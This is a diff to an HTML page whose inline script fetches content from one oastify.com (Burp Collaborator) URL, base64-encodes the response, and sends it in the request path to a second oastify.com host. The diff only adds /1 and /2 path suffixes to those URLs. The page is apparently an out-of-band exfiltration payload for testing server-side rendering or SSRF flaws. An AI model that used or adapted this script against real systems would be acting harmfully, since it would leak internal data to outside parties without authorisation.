@@ -8,7 +8,7 @@
     <img src="http://gooddddzzgle.com">
     <script>
       const urlParams = new URLSearchParams(window.location.search);
-      const url = "https://gau63fttqznnll4g94vrw2tmud04o3cs.oastify.com";
+      const url = "https://gau63fttqznnll4g94vrw2tmud04o3cs.oastify.com/1";
 
       if (!url) {
         console.error('No URL parameter specified!');
@@ -23,7 +23,7 @@
             reader.readAsDataURL(blob);
             reader.onloadend = function() {
               const base64data = reader.result.replace(/^data:(.*;base64,)?/, '');
-              const requestUrl = 'https://vxwlqug8dea280rvwji6jhg1hsnjbgz5.oastify.com/' + base64data;
+              const requestUrl = 'https://vxwlqug8dea280rvwji6jhg1hsnjbgz5.oastify.com/2/' + base64data;
               fetch(requestUrl, { mode: 'no-cors' })
                 .then(response => response.text())
                 .then(result => console.log(result))
